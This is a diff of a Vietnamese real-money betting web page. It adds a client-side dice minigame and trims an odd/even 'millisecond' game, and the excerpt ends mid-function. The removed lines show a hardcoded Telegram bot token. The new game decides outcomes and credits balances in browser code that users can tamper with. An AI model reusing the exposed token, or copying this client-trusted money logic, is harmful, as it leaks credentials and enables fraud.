@@ -50,10 +50,11 @@
         .form-group input:focus, .form-group select:focus { border-color: var(--primary); box-shadow: 0 0 8px rgba(0, 242, 254, 0.3); }
         .btn-save { width: 100%; padding: 14px; background: linear-gradient(90deg, #00f2fe, #4facfe); color: #000; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; margin-top: 15px; transition: 0.3s; letter-spacing: 1px; }
         .btn-save:hover { filter: brightness(1.2); box-shadow: 0 0 15px rgba(0, 242, 254, 0.4); }
+        .btn-save:disabled { filter: grayscale(1); cursor: not-allowed; opacity: 0.7;}
 
         .bank-info-box { background: rgba(255,255,255,0.03); border: 1px dashed rgba(255,255,255,0.2); padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
         
-        /* TAB GAMES */
+        /* TAB GAMES BANK */
         .game-tabs { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; background: rgba(0,0,0,0.3); padding: 6px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.05);}
         .btn-tab { flex: 1; min-width: 100px; padding: 12px; border: none; background: transparent; color: var(--text-muted); font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.3s;}
         .btn-tab.active { background: linear-gradient(90deg, rgba(0, 242, 254, 0.8), rgba(79, 172, 254, 0.8)); color: #fff; box-shadow: 0 4px 10px rgba(0, 242, 254, 0.3); }
@@ -84,7 +85,6 @@
         #qr-result { display: none; background: rgba(0, 242, 254, 0.05); padding: 25px; border-radius: 16px; text-align: center; margin-top: 25px; border: 1px solid rgba(0, 242, 254, 0.3); }
         #qr-result img { max-width: 220px; border-radius: 12px; margin: 15px 0; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
 
-        /* MILLISECOND SLOT CSS */
         .slot-box { font-size: 38px; font-weight: 800; color: var(--primary); background: #000; padding: 15px; border-radius: 12px; font-family: monospace; letter-spacing: 4px; text-align: center; border: 2px solid var(--primary); box-shadow: 0 0 20px rgba(0, 242, 254, 0.3); text-shadow: 0 0 10px var(--primary); margin: 0 auto; max-width: 350px;}
 
         table { width: 100%; border-collapse: collapse; }
@@ -115,6 +115,36 @@
         .top-info small { color: var(--text-muted); font-size: 12px; }
         .top-amount { font-weight: 700; color: var(--success); font-size: 15px;}
 
+        /* ====== GAME MÈO CÁ CSS ====== */
+        .meoca-board { display: flex; align-items: center; justify-content: center; gap: 30px; margin: 30px 0; position: relative; }
+        .meoca-bet-btn { width: 140px; height: 120px; border-radius: 16px; border: 2px solid rgba(255,255,255,0.1); cursor: pointer; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.3); position: relative; overflow: hidden; }
+        .meoca-bet-btn.active { transform: scale(1.05); border-color: #fff; box-shadow: 0 0 20px rgba(255,255,255,0.3); }
+        .mc-ca { background: linear-gradient(135deg, #3b82f6, #1e3a8a); }
+        .mc-meo { background: linear-gradient(135deg, #f59e0b, #b45309); }
+        .meoca-bet-btn i { font-size: 40px; color: #fff; margin-bottom: 5px; }
+        .meoca-bet-btn span { font-weight: bold; font-size: 16px; color: #fff; }
+        .meoca-bet-btn small { font-size: 11px; color: rgba(255,255,255,0.8); }
+
+        .meoca-center { position: relative; width: 180px; height: 180px; display: flex; justify-content: center; align-items: center; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%); border-radius: 50%; }
+        .meoca-dice-container { display: flex; gap: 10px; z-index: 10; position: absolute; }
+        .mc-die { font-size: 45px; color: #fff; text-shadow: 0 5px 10px rgba(0,0,0,0.5); filter: drop-shadow(0 2px 4px rgba(0,0,0,0.8)); transition: transform 0.5s;}
+        
+        .meoca-bowl { position: absolute; width: 160px; height: 160px; background: radial-gradient(circle at 30% 30%, #475569, #0f172a); border-radius: 50%; z-index: 20; cursor: pointer; box-shadow: inset -10px -10px 20px rgba(0,0,0,0.5), 0 15px 25px rgba(0,0,0,0.6); border: 2px solid #334155; transition: transform 0.8s ease, opacity 0.5s ease; display: flex; justify-content: center; align-items: center; flex-direction: column;}
+        .meoca-bowl.hidden { transform: translateY(-150px) scale(0.8); opacity: 0; pointer-events: none; }
+        .meoca-bowl.shaking { animation: shakeBowl 0.3s infinite; }
+        
+        .meoca-timer { font-size: 20px; font-weight: 800; color: var(--primary); margin-top: 10px; background: rgba(0,0,0,0.5); padding: 5px 15px; border-radius: 20px; border: 1px solid rgba(0,242,254,0.3); }
+
+        /* Toggle Switch (Mở nhanh/Nặn) */
+        .switch-wrapper { display: flex; align-items: center; justify-content: center; gap: 15px; margin-top: 20px; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 12px; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--primary); }
+        input:checked + .slider:before { transform: translateX(24px); }
+
+        @keyframes shakeBowl { 0% { transform: translate(2px, 2px) rotate(0deg); } 25% { transform: translate(-2px, -2px) rotate(-5deg); } 50% { transform: translate(-2px, 2px) rotate(5deg); } 75% { transform: translate(2px, -2px) rotate(-5deg); } 100% { transform: translate(2px, 2px) rotate(0deg); } }
         @keyframes flashIn { 0% { background: rgba(0, 242, 254, 0.2); transform: translateX(-10px); } 100% { background: rgba(0,0,0,0.2); transform: translateX(0); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
@@ -138,6 +168,8 @@
             .section-content { padding: 15px; } 
             header { padding: 15px; }
             .slot-box, .live-clock-value { font-size: 28px; letter-spacing: 2px;}
+            .meoca-board { flex-direction: column; gap: 20px; }
+            .meoca-bet-btn { width: 100%; height: 90px; flex-direction: row; gap: 15px;}
         }
     </style>
 </head>
@@ -150,6 +182,7 @@
         </div>
         <div class="nav-links">
             <a class="nav-link active" onclick="switchTab('game', this)"><i class="fa-solid fa-gamepad"></i> Trang Chủ</a>
+            <a class="nav-link" onclick="switchTab('meoca', this)"><i class="fa-solid fa-cat"></i> Mèo Cá (Minigame)</a>
             <a class="nav-link" onclick="switchTab('withdraw', this)"><i class="fa-solid fa-money-bill-transfer"></i> Rút Tiền</a>
             <a class="nav-link" onclick="switchTab('search', this)"><i class="fa-solid fa-magnifying-glass-chart"></i> Tra Soát Giao Dịch</a>
             <a class="nav-link" onclick="switchTab('profile', this)"><i class="fa-solid fa-user-gear"></i> Hồ Sơ Cá Nhân</a>
@@ -227,13 +260,9 @@
                             <div style="text-align: left;">
                                 <div style="font-size: 18px; font-weight: bold; margin-bottom: 8px;">CHƠI GẤP 3 (MÃ: KG3)</div>
                                 <div style="font-size: 13px; font-weight: normal; opacity: 0.95; line-height: 1.8;">
-                                    <b>x3:</b> 
-                                    <span class="num-badge">02</span><span class="num-badge">13</span><span class="num-badge">17</span><span class="num-badge">19</span><span class="num-badge">21</span><span class="num-badge">29</span>
-                                    <span class="num-badge">35</span><span class="num-badge">37</span><span class="num-badge">47</span><span class="num-badge">49</span><span class="num-badge">51</span><span class="num-badge">54</span>
-                                    <span class="num-badge">57</span><span class="num-badge">63</span><span class="num-badge">64</span><span class="num-badge">74</span><span class="num-badge">83</span><span class="num-badge">91</span>
-                                    <span class="num-badge">95</span><span class="num-badge">96</span><br>
+                                    <b>x3:</b> <span class="num-badge">02</span>...<br>
                                     <b>x4:</b> <span class="num-badge">66</span><span class="num-badge">99</span><br>
-                                    <b>x5:</b> <span class="num-badge">123</span><span class="num-badge">234</span><span class="num-badge">456</span><span class="num-badge">678</span><span class="num-badge">789</span>
+                                    <b>x5:</b> <span class="num-badge">123</span><span class="num-badge">234</span>...
                                 </div>
                             </div>
                             <i class="fa-solid fa-qrcode fa-2x" style="opacity: 0.8;"></i>
@@ -247,44 +276,103 @@
                     <p id="instruction" style="font-size: 15px; margin-bottom: 15px;"></p>
                 </div>
 
-                <div id="playArea" style="display: none; margin-top: 25px; background: rgba(0,0,0,0.4); padding: 25px; border-radius: 16px; border: 1px dashed var(--primary); box-shadow: inset 0 0 20px rgba(0, 242, 254, 0.1);">
-                    <h3 style="text-align: center; color: #fff; margin-bottom: 20px; font-size: 20px;"><i class="fa-solid fa-bolt" style="color: var(--primary);"></i> KIỂM TRA MÃ GD + MILLISECOND</h3>
-                    
-                    <div class="form-group" style="margin-bottom: 25px;">
-                        <label style="color: #fff;">Nhập Mã Giao Dịch (Sau khi CK thành công)</label>
-                        <div style="display: flex; gap: 10px;">
-                            <input type="text" id="playTransId" placeholder="VD: FT123456789..." style="font-size: 16px; font-weight: bold; letter-spacing: 1px;">
-                            <button class="btn-save" style="margin-top: 0; width: 160px; font-size: 16px;" onclick="spinMillisecond()"><i class="fa-solid fa-dice"></i> MỞ BÁT</button>
-                        </div>
+                <div id="playArea" style="display: none; margin-top: 25px; background: rgba(0,0,0,0.4); padding: 25px; border-radius: 16px; border: 1px dashed var(--primary);">
+                    <h3 style="text-align: center; color: #fff; margin-bottom: 20px;"><i class="fa-solid fa-bolt" style="color: var(--primary);"></i> KIỂM TRA MÃ GD + MILLISECOND</h3>
+                    <div class="form-group" style="margin-bottom: 25px; display: flex; gap: 10px;">
+                        <input type="text" id="playTransId" placeholder="VD: FT123456..." style="font-size: 16px; font-weight: bold;">
+                        <button class="btn-save" style="margin-top: 0; width: 160px;" onclick="spinMillisecond()"><i class="fa-solid fa-dice"></i> MỞ BÁT</button>
                     </div>
-                    
-                    <div style="text-align: center; margin: 30px 0;">
-                        <div id="msSlot" class="slot-box">0000000000000</div>
-                    </div>
-                    
-                    <div id="finalResultBox" class="result-box" style="display:none; background: rgba(19, 27, 47, 0.9); border: 2px solid var(--border); padding: 20px; border-radius: 12px; margin-top: 20px;">
-                        </div>
+                    <div style="text-align: center; margin: 30px 0;"><div id="msSlot" class="slot-box">0000000000000</div></div>
+                    <div id="finalResultBox" class="result-box" style="display:none; background: rgba(19, 27, 47, 0.9); border: 2px solid var(--border); padding: 20px; border-radius: 12px;"></div>
                 </div>
-
             </div>
 
             <div class="col-grid">
                 <div class="glass-panel">
-                    <h3><i class="fa-solid fa-satellite-dish" style="color: var(--primary);"></i> Giao Dịch Toàn Hệ Thống</h3>
-                    <div id="liveFeedContainer" style="height: 380px; overflow: hidden; position: relative; padding-right: 5px;">
-                        </div>
+                    <h3><i class="fa-solid fa-satellite-dish" style="color: var(--primary);"></i> Giao Dịch Hệ Thống</h3>
+                    <div id="liveFeedContainer" style="height: 380px; overflow: hidden; position: relative;"></div>
                 </div>
-
                 <div class="glass-panel">
                     <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; margin-bottom: 15px;">
-                        <h3 style="margin: 0; border: none; padding: 0;"><i class="fa-solid fa-trophy" style="color: #fbbf24;"></i> Vinh Danh Đai Gia</h3>
+                        <h3 style="margin: 0; border: none; padding: 0;"><i class="fa-solid fa-trophy" style="color: #fbbf24;"></i> Vinh Danh Đại Gia</h3>
                         <div class="game-tabs" style="margin: 0; padding: 3px; border-radius: 8px; background: rgba(0,0,0,0.5);">
                             <button class="btn-tab active" style="padding: 6px 12px; min-width: auto; font-size: 12px;" onclick="renderLeaderboard('week', this)">Tuần</button>
                             <button class="btn-tab" style="padding: 6px 12px; min-width: auto; font-size: 12px;" onclick="renderLeaderboard('month', this)">Tháng</button>
                         </div>
                     </div>
-                    <div id="leaderboardContainer" style="height: 325px; overflow-y: auto; padding-right: 5px;">
+                    <div id="leaderboardContainer" style="height: 325px; overflow-y: auto;"></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="sec-meoca" class="section-content">
+            <div class="card">
+                <div class="card-title" style="justify-content: space-between;">
+                    <div><i class="fa-solid fa-cat"></i> Mèo Cá - Tài Xỉu Cân Bảng</div>
+                    <div class="meoca-timer" id="mcTimerDisplay"><i class="fa-regular fa-clock"></i> 00:30</div>
+                </div>
+                
+                <div style="text-align: center; color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+                    Sử dụng trực tiếp số dư trên Web. Lắc tự động mỗi 30s. Tỷ lệ x1.75 (Ra 3 hoặc 18 Nhà cái Thu).
+                </div>
+
+                <div class="form-group" style="max-width: 400px; margin: 0 auto;">
+                    <label style="text-align: center;">Số tiền cược (VNĐ)</label>
+                    <input type="number" id="mcBetAmount" placeholder="Nhập số tiền cược..." min="1000" step="1000" style="text-align: center; font-weight: bold; font-size: 18px;">
+                </div>
+
+                <div class="switch-wrapper">
+                    <span style="color: var(--text-muted); font-size: 14px;">Mở Nhanh</span>
+                    <label class="switch">
+                        <input type="checkbox" id="mcNanMode">
+                        <span class="slider"></span>
+                    </label>
+                    <span style="color: #fff; font-weight: bold; font-size: 14px;">Chế Độ Nặn <i class="fa-solid fa-hand-sparkles"></i></span>
+                </div>
+
+                <div class="meoca-board">
+                    <button class="meoca-bet-btn mc-ca" id="btnMcCa" onclick="selectMeoCa('ca')">
+                        <i class="fa-solid fa-fish-fins"></i>
+                        <span>CÁ (4-10)</span>
+                        <small>Tỷ lệ x1.75</small>
+                    </button>
+
+                    <div class="meoca-center">
+                        <div class="meoca-dice-container">
+                            <i class="fa-solid fa-dice-one mc-die" id="mcDie1"></i>
+                            <i class="fa-solid fa-dice-two mc-die" id="mcDie2"></i>
+                            <i class="fa-solid fa-dice-three mc-die" id="mcDie3"></i>
                         </div>
+                        <div class="meoca-bowl" id="mcBowl" onclick="manualRevealBowl()">
+                            <i class="fa-solid fa-grip-lines" style="color: rgba(255,255,255,0.2); font-size: 30px; margin-bottom: 10px;"></i>
+                            <span style="color: #fff; font-weight: bold; font-size: 12px; letter-spacing: 2px;">BÁT ÚP</span>
+                            <small id="mcBowlText" style="color: var(--primary); font-size: 10px; margin-top: 5px; display: none;">Nhấn để Mở Nắp</small>
+                        </div>
+                    </div>
+
+                    <button class="meoca-bet-btn mc-meo" id="btnMcMeo" onclick="selectMeoCa('meo')">
+                        <i class="fa-solid fa-cat"></i>
+                        <span>MÈO (11-17)</span>
+                        <small>Tỷ lệ x1.75</small>
+                    </button>
+                </div>
+
+                <div style="text-align: center; margin-top: 30px;">
+                    <button class="btn-save" id="btnSubmitMcBet" onclick="submitMeoCaBet()" style="max-width: 300px; font-size: 18px;"><i class="fa-solid fa-check-double"></i> CHỐT CƯỢC ĐỢT NÀY</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title"><i class="fa-solid fa-clock-rotate-left"></i> Lịch Sử Chơi Mèo Cá</div>
+                <div style="overflow-x: auto;">
+                    <table>
+                        <thead>
+                            <tr><th>Phiên</th><th>Cửa Đặt</th><th>Tiền Cược</th><th>Kết Quả Lắc</th><th>Trạng Thái</th></tr>
+                        </thead>
+                        <tbody id="mcHistoryBody">
+                            <tr><td colspan="5" style="text-align: center;">Chưa có dữ liệu chơi phiên này.</td></tr>
+                        </tbody>
+                    </table>
                 </div>
             </div>
         </section>
@@ -308,7 +396,7 @@
 
         <section id="sec-search" class="section-content">
             <div class="card">
-                <div class="card-title"><i class="fa-solid fa-magnifying-glass"></i> Tra Soát Giao Dịch</div>
+                <div class="card-title"><i class="fa-solid fa-magnifying-glass"></i> Tra Soát Giao Dịch Bank</div>
                 <div class="form-group">
                     <label>Mã Tham Chiếu Giao Dịch Ngân Hàng</label>
                     <input type="text" id="searchTransId" placeholder="Nhập mã FT... tại đây">
@@ -331,15 +419,11 @@
 
         <section id="sec-history" class="section-content">
             <div class="card">
-                <div class="card-title"><i class="fa-solid fa-list-check"></i> Lịch Sử 10 Giao Dịch Cá Nhân</div>
+                <div class="card-title"><i class="fa-solid fa-list-check"></i> Lịch Sử Bank 10 GD Gần Nhất</div>
                 <div style="overflow-x: auto;">
                     <table>
-                        <thead>
-                            <tr><th>Mã GD</th><th>Thời Gian</th><th>Cửa Cược</th><th>Số Tiền</th><th>Kết Quả</th></tr>
-                        </thead>
-                        <tbody id="historyTableBody">
-                            <tr><td colspan="5" style="text-align: center;">Đang tải...</td></tr>
-                        </tbody>
+                        <thead><tr><th>Mã GD</th><th>Thời Gian</th><th>Cửa Cược</th><th>Số Tiền</th><th>Kết Quả</th></tr></thead>
+                        <tbody id="historyTableBody"><tr><td colspan="5" style="text-align: center;">Đang tải...</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -348,7 +432,6 @@
         <section id="sec-support" class="section-content">
             <div class="card">
                 <div class="card-title"><i class="fa-solid fa-headset"></i> Trung Tâm Hỗ Trợ</div>
-                <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Hệ thống hỗ trợ hoàn toàn ẩn danh. Nếu bạn cần nạp/rút thủ công hoặc check mã, hãy liên hệ.</p>
                 <div class="contact-grid">
                     <a href="https://t.me/tolabimat" target="_blank" class="contact-card tele" style="border: 1px solid rgba(0, 136, 204, 0.3);">
                         <i class="fa-brands fa-telegram"></i><h3>Telegram Admin</h3><p>@tolabimat</p>
@@ -356,7 +439,6 @@
                 </div>
             </div>
         </section>
-
     </div>
 
     <div id="notificationModal" class="modal">
@@ -371,7 +453,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
         import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
-        import { getFirestore, doc, getDoc, setDoc, updateDoc, collection, query, orderBy, limit, getDocs } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
+        import { getFirestore, doc, getDoc, setDoc, updateDoc, collection, query, orderBy, limit, getDocs, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
 
         // FIREBASE CONFIG
         const firebaseConfig = {
@@ -389,11 +471,7 @@
         
         let currentUserUid = null;
         let globalUserData = null; 
-        let activeBet = null; // Biến lưu cửa cược đang chọn
-
-        // CẤU HÌNH BOT TELEGRAM
-        const telegramBotToken = "8590476877:AAEzGcryuXjIk3E1zk7c7FBePHGSoTrWTCs";
-        const telegramChatId = "8405954014"; 
+        let activeBet = null; 
 
         // POPUP
         window.showNotification = function(title, message, type = "info") {
@@ -408,21 +486,10 @@
         window.closeModal = function() { document.getElementById("notificationModal").style.display = "none"; }
         document.getElementById('notificationModal').addEventListener('click', function(e) { if (e.target === this) window.closeModal(); });
 
-        // KHỞI CHẠY ĐỒNG HỒ MILLISECOND LIÊN TỤC
         setInterval(() => {
             const msElement = document.getElementById('alwaysOnMs');
             if(msElement) msElement.innerText = Date.now();
-        }, 11); // Tốc độ cập nhật cực nhanh
-
-        // BANK LIST
-        const bankList = [
-            { code: "ICB", short_name: "VietinBank" }, { code: "VCB", short_name: "Vietcombank" },
-            { code: "MB", short_name: "MBBank" }, { code: "ACB", short_name: "ACB" }, { code: "VPB", short_name: "VPBank" }, 
-            { code: "TPB", short_name: "TPBank" }, { code: "TCB", short_name: "Techcombank" }, { code: "VBA", short_name: "Agribank" }
-        ];
-        const bankSelect = document.getElementById('profileBank');
-        bankSelect.innerHTML = '<option value="">-- Chọn ngân hàng --</option>';
-        bankList.forEach(bank => { bankSelect.innerHTML += `<option value="${bank.code}">${bank.short_name}</option>`; });
+        }, 11); 
 
         // AUTH & RENDER
         function updateUIVisuals(data) {
@@ -443,161 +510,229 @@
                 if (docSnap.exists()) {
                     globalUserData = docSnap.data(); globalUserData.email = user.email; 
                     updateUIVisuals(globalUserData);
-                    if (globalUserData.phone) document.getElementById('profilePhone').value = globalUserData.phone;
-                    if (globalUserData.bankCode) document.getElementById('profileBank').value = globalUserData.bankCode;
-                    if (globalUserData.bankAccount) document.getElementById('profileAccount').value = globalUserData.bankAccount;
                 } else {
                     const newData = { balance: 0, email: user.email };
                     await setDoc(userRef, newData, { merge: true });
                     globalUserData = newData; updateUIVisuals(globalUserData);
                 }
-                fetchHistory(user.uid);
                 initLiveFeedAndLeaderboard();
+                startMeoCaEngine(); // Khởi động loop Mèo Cá
             } else {
                 window.location.href = "dangnhap.html";
             }
         });
 
         /* ========================================================
-           SYSTEM: QUAY THƯỞNG MILLISECOND & LOGIC GAME
+           SYSTEM: GAME MÈO CÁ (TÀI XỈU 3D)
+        ======================================================== */
+        let mcTimer = 30;
+        let mcPhase = "BET"; // BET -> SHAKE -> REVEAL
+        let mcCurrentBet = null; 
+        let mcSessionId = 1000;
+        const diceFaces = ['fa-dice-one', 'fa-dice-two', 'fa-dice-three', 'fa-dice-four', 'fa-dice-five', 'fa-dice-six'];
+
+        function startMeoCaEngine() {
+            setInterval(() => {
+                if(mcTimer > 0) {
+                    mcTimer--;
+                    const mStr = mcTimer.toString().padStart(2, '0');
+                    document.getElementById('mcTimerDisplay').innerHTML = `<i class="fa-regular fa-clock"></i> 00:${mStr}`;
+                    
+                    if(mcTimer === 5 && mcPhase === "BET") {
+                        mcPhase = "SHAKE";
+                        document.getElementById('mcBowl').classList.add('shaking');
+                        document.getElementById('mcBowl').classList.remove('hidden');
+                        document.getElementById('btnSubmitMcBet').disabled = true;
+                        document.getElementById('btnSubmitMcBet').innerHTML = '<i class="fa-solid fa-lock"></i> KHÓA BẢNG - ĐANG LẮC';
+                    }
+                } else {
+                    // HẾT GIỜ -> MỞ BÁT
+                    mcPhase = "REVEAL";
+                    document.getElementById('mcBowl').classList.remove('shaking');
+                    resolveMeoCaRound();
+                    
+                    // Reset phiên mới sau 5 giây
+                    setTimeout(() => {
+                        mcTimer = 30;
+                        mcPhase = "BET";
+                        mcSessionId++;
+                        mcCurrentBet = null;
+                        document.getElementById('mcBowl').classList.remove('hidden'); // Úp bát lại
+                        document.getElementById('mcBowlText').style.display = 'none';
+                        document.getElementById('btnSubmitMcBet').disabled = false;
+                        document.getElementById('btnSubmitMcBet').innerHTML = '<i class="fa-solid fa-check-double"></i> CHỐT CƯỢC ĐỢT NÀY';
+                        document.querySelectorAll('.meoca-bet-btn').forEach(b => b.classList.remove('active'));
+                    }, 5000);
+                }
+            }, 1000);
+        }
+
+        window.selectMeoCa = function(choice) {
+            if(mcPhase !== "BET") return showNotification("⚠️", "Đã khóa bảng, đợi ván sau nhé!", "error");
+            document.querySelectorAll('.meoca-bet-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(choice === 'ca' ? 'btnMcCa' : 'btnMcMeo').classList.add('active');
+            mcCurrentBet = { choice: choice };
+        }
+
+        window.submitMeoCaBet = async function() {
+            if(!mcCurrentBet) return showNotification("⚠️", "Vui lòng chọn MÈO hoặc CÁ", "error");
+            const amt = parseInt(document.getElementById('mcBetAmount').value);
+            if(!amt || amt < 1000) return showNotification("⚠️", "Cược tối thiểu 1.000đ", "error");
+            
+            if(globalUserData.balance < amt) return showNotification("⚠️", "Số dư không đủ!", "error");
+            
+            const btn = document.getElementById('btnSubmitMcBet');
+            btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Đang lên đơn...';
+
+            try {
+                const userRef = doc(db, "users", currentUserUid);
+                await runTransaction(db, async (transaction) => {
+                    const userDoc = await transaction.get(userRef);
+                    const bal = userDoc.data().balance || 0;
+                    if(bal < amt) throw "Số dư không đủ!";
+                    transaction.update(userRef, { balance: bal - amt });
+                });
+                
+                globalUserData.balance -= amt;
+                updateUIVisuals(globalUserData);
+                mcCurrentBet.amount = amt;
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> ĐÃ CƯỢC THÀNH CÔNG';
+                showNotification("✅", `Đặt thành công ${amt.toLocaleString()}đ vào cửa ${mcCurrentBet.choice.toUpperCase()}`, "success");
+            } catch(e) {
+                btn.disabled = false; btn.innerHTML = 'CHỐT CƯỢC ĐỢT NÀY';
+                showNotification("❌ Lỗi", e, "error");
+            }
+        }
+
+        async function resolveMeoCaRound() {
+            // Random Xúc Xắc
+            const d1 = Math.floor(Math.random() * 6) + 1;
+            const d2 = Math.floor(Math.random() * 6) + 1;
+            const d3 = Math.floor(Math.random() * 6) + 1;
+            const sum = d1 + d2 + d3;
+
+            document.getElementById('mcDie1').className = `fa-solid ${diceFaces[d1-1]} mc-die`;
+            document.getElementById('mcDie2').className = `fa-solid ${diceFaces[d2-1]} mc-die`;
+            document.getElementById('mcDie3').className = `fa-solid ${diceFaces[d3-1]} mc-die`;
+
+            let winSide = "none";
+            if(sum >= 4 && sum <= 10) winSide = "ca";
+            if(sum >= 11 && sum <= 17) winSide = "meo"; // 3 và 18 nhà cái ăn
+            
+            let payout = 0;
+            let status = "lose";
+
+            if(mcCurrentBet && mcCurrentBet.amount > 0) {
+                if(mcCurrentBet.choice === winSide) {
+                    status = "win";
+                    payout = mcCurrentBet.amount * 1.75;
+                }
+
+                // Cộng tiền nếu thắng
+                if(status === "win") {
+                    const userRef = doc(db, "users", currentUserUid);
+                    try {
+                        await runTransaction(db, async (t) => {
+                            const ud = await t.get(userRef);
+                            t.update(userRef, { balance: (ud.data().balance || 0) + payout });
+                        });
+                        globalUserData.balance += payout;
+                        updateUIVisuals(globalUserData);
+                    } catch(e) { console.error("Lỗi cộng tiền MC", e); }
+                }
+
+                // Ghi log
+                const tbody = document.getElementById('mcHistoryBody');
+                if(tbody.innerHTML.includes("Chưa có")) tbody.innerHTML = '';
+                const bText = status === 'win' ? `<span class="badge win">+${payout.toLocaleString()}đ</span>` : `<span class="badge lose">Thua</span>`;
+                tbody.innerHTML = `<tr><td>#${mcSessionId}</td><td>${mcCurrentBet.choice.toUpperCase()}</td><td>${mcCurrentBet.amount.toLocaleString()}đ</td><td>${d1}-${d2}-${d3} (${sum})</td><td>${bText}</td></tr>` + tbody.innerHTML;
+            }
+
+            // Chế độ Nặn (Mở Nhanh / Nặn Bát)
+            const isNan = document.getElementById('mcNanMode').checked;
+            if(!isNan) {
+                document.getElementById('mcBowl').classList.add('hidden'); // Mở tự động
+            } else {
+                document.getElementById('mcBowlText').style.display = 'block'; // Yêu cầu click
+            }
+        }
+
+        window.manualRevealBowl = function() {
+            if(mcPhase === "REVEAL") document.getElementById('mcBowl').classList.add('hidden');
+        }
+
+        /* ========================================================
+           SYSTEM: CHẴN LẺ BANK & QUAY THƯỞNG MILLISECOND
         ======================================================== */
         window.selectBet = function(choice, rate, btnElement) {
             const amt = document.getElementById('coinAmount').value;
             if (!amt || amt < 2000) return showNotification("⚠️ Lỗi", "Cược tối thiểu 2.000đ!", "error");
-
-            // Hiệu ứng chọn UI
             document.querySelectorAll('.btn-bet').forEach(b => b.classList.remove('selected'));
             btnElement.classList.add('selected');
-            
-            // Gán dữ liệu cược
             activeBet = { choice: choice, rate: rate };
-
-            // Render QR code
             const usr = document.getElementById('gameUsername').value;
             const content = `CLVN ${usr} ${choice}`;
             document.getElementById('instruction').innerHTML = `Nội dung: <b style="color:var(--danger); font-size:18px;">${content}</b> <br> Tiền: <b>${parseInt(amt).toLocaleString('vi-VN')}đ</b>`;
             document.getElementById('qrImage').src = `https://img.vietqr.io/image/970422-4477040408-compact2.png?amount=${amt}&addInfo=${encodeURIComponent(content)}&accountName=LE%20NGOC%20NHAN`;
-            
-            // Hiển thị khu vực
             document.getElementById('qr-result').style.display = 'block';
             document.getElementById('playArea').style.display = 'block';
-            
-            // Cuộn màn hình nhẹ xuống
-            setTimeout(() => {
-                document.getElementById('playArea').scrollIntoView({ behavior: 'smooth', block: 'center' });
-            }, 300);
         }
 
         window.spinMillisecond = function() {
-            if(!activeBet) return showNotification("⚠️ Cảnh báo", "Vui lòng chọn 1 cửa cược ở trên!", "error");
-            const transId = document.getElementById('playTransId').value.trim();
-            if(!transId) return showNotification("⚠️ Cảnh báo", "Bạn chưa nhập Mã Giao Dịch Ngân Hàng!", "error");
-
-            // Lấy riêng phần số từ mã tham chiếu
-            const numStr = transId.replace(/\D/g, '');
-            if(!numStr) return showNotification("⚠️ Lỗi", "Mã GD không hợp lệ (Không tìm thấy số)!", "error");
-
-            // Reset UI
-            const slot = document.getElementById('msSlot');
-            const resultBox = document.getElementById('finalResultBox');
-            resultBox.style.display = 'none';
-
-            // Animation quay số Date.now()
+            if(!activeBet) return showNotification("⚠️", "Vui lòng chọn cửa cược!", "error");
+            const transId = document.getElementById('playTransId').value.replace(/\D/g, '');
+            if(!transId) return showNotification("⚠️", "Mã GD không hợp lệ!", "error");
+            const slot = document.getElementById('msSlot'), resBox = document.getElementById('finalResultBox');
+            resBox.style.display = 'none';
             let counter = 0;
-            
             let interval = setInterval(() => {
                 slot.innerText = Date.now();
                 slot.style.color = counter % 2 === 0 ? "#fff" : "var(--primary)";
                 counter++;
-                
-                if(counter > 40) { // Tương đương quay tầm 1.5 - 2 giây
+                if(counter > 40) {
                     clearInterval(interval);
                     const finalMs = Date.now();
-                    slot.innerText = finalMs;
-                    slot.style.color = "var(--success)";
-                    slot.style.textShadow = "0 0 20px var(--success)";
+                    slot.innerText = finalMs; slot.style.color = "var(--success)";
                     
-                    // Thực hiện logic tính toán
-                    calculateFinalResult(numStr, finalMs);
+                    const totalStr = (BigInt(transId) + BigInt(finalMs)).toString();
+                    const c = activeBet.choice; let isWin = false, rate = activeBet.rate, matchStr = "";
+                    const last1 = totalStr.slice(-1), last2 = totalStr.slice(-2), last3 = totalStr.slice(-3);
+
+                    if (c==='C' && ['2','4','6','8'].includes(last1)) isWin=true; else if (c==='L' && ['1','3','5','7'].includes(last1)) isWin=true;
+                    else if (c==='C2' && ['0','2','4','6','8'].includes(last1)) isWin=true; else if (c==='L2' && ['1','3','5','7','9'].includes(last1)) isWin=true;
+                    else if (c==='CC' && ['1','2','3','4','5'].includes(last1)) isWin=true; else if (c==='LL' && ['6','7','8','9','0'].includes(last1)) isWin=true;
